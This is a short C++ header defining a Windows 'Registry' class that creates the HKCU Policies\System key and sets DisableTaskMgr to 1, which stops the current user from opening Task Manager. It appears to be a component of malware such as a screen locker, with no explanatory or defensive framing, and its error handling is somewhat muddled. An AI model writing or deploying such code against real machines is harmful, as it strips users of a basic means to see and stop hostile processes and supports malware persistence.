#pragma once
#include <iostream>
#include <Windows.h>

#define WIN32_LEAN_AND_MEAN
#pragma warning(disable:4129)

class Registry {
private:
	
	LPCWSTR DisableTaskMgr = TEXT("DisableTaskMgr");
	HKEY hKey = HKEY_CURRENT_USER;
	LPCWSTR TMGR_PATH = (L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\");
	DWORD val_disable = 1;
	DWORD val_enable = 0;

public:
	void ProcessValue()
	{
		if (RegQueryValueEx(hKey, DisableTaskMgr, NULL, NULL, NULL, NULL) == ERROR_FILE_NOT_FOUND)
		{

			if (RegSetValueEx(hKey, DisableTaskMgr, 0, REG_DWORD, (const BYTE*)&val_disable, sizeof(val_disable)) != ERROR_SUCCESS)
			{
				exit(0);
				return;
			}
			else
			{
				RegCloseKey(hKey);
			}
		}
		else
		{
			RegSetValueEx(hKey, DisableTaskMgr, 0, REG_DWORD, (const BYTE*)&val_disable, sizeof(val_disable));
			RegCloseKey(hKey);
			return;
		}
		RegCloseKey(hKey);
	}
	void ModifyRegistry()
	{
		RegOpenKeyEx(hKey, TMGR_PATH, 0, KEY_ALL_ACCESS, &hKey);

		if (RegCreateKeyEx(hKey, L"System", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL) != ERROR_SUCCESS)
		{
			TMGR_PATH = (L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\");
			ProcessValue();
		}
		else
		{
			ProcessValue();
		}
		return;
	}

};
